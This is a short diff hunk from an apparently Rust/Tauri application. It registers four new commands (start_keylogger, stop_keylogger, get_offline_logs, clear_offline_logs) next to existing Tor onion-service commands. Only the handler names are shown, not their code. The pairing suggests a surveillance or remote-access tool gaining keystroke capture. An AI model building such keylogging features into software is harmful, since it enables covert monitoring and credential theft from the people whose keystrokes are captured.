@@ -58,6 +58,10 @@ async fn main() {
             init_tor,
             create_onion,
             delete_onion,
+            start_keylogger,
+            stop_keylogger,
+            get_offline_logs,
+            clear_offline_logs,
         ])
         .run(tauri::generate_context!())
         .expect("error while running tauri application");
